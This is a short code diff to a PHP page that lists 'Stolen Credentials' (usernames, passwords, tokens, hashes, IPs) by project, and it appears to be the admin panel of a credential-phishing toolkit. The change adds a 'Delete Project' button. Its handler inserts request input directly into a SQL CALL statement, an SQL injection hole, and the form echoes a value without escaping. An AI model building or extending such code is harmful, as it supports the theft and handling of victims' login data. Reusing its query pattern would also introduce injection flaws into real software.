@@ -228,6 +228,14 @@ if ($conn->connect_error) {
     die("Connection failed: " . $conn->connect_error);
 }
 
+if(isset($_REQUEST['deleteproject'])){
+
+// Show Credentails for the Selected Project
+$sql = "CALL RemoveProjects('".$_REQUEST['deleteproject']."');";
+$result = $conn->query($sql);
+
+}
+
 // If the Project is Not Already Selected..
 if(!isset($_REQUEST['project'])){
 
@@ -276,6 +284,16 @@ $result = $conn->query($sql);
 
 ?>
     <h2><FONT COLOR="#FFFFFF">Stolen Credentials</FONT></h2>
+
+
+
+<FORM METHOD="POST" ACTION="<?php echo $_SERVER['PHP_SELF'];?>">
+<input type="hidden" name="deleteproject" value="<?php echo $project; ?>">
+<input type="submit" value="Delete Project">
+</FORM>
+
+
+
 <TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH><TH>Hash</TH><TH>Actions</TH></TR>
 <?php
     // output data of each row
